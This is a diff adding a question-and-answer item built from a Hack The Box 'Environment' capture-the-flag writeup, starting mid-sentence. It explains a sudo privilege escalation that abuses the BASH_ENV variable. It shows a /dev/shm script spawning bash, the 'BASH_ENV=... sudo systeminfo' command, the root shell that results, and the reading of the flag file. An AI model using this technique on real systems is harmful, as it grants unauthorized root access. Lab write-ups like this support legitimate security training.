@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Explain the purpose and usage of the code/command in the following text: (Context: Writeup from Htb Environment Hacks Stuff)
+
+CONTEXT:
+Source: Htb Environment Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+option, Bash attempts to read and execute commands from the login shell startup files. So when a script starts, the script in the $BASH_ENV path is just executed. Exploit To exploit this, I’ll write a simple shell script that runs bash : hish@environment:~$ cat /dev/shm/shell.sh #!/bin/bash /bin/bash Now I run systeminfo with sudo and BASH_ENV set: hish@environment:~$ BASH_ENV = /dev/shm/shell.sh sudo systeminfo root@environment:/home/hish# And grab the root flag: root@environment:~# cat root.txt e6740876************************
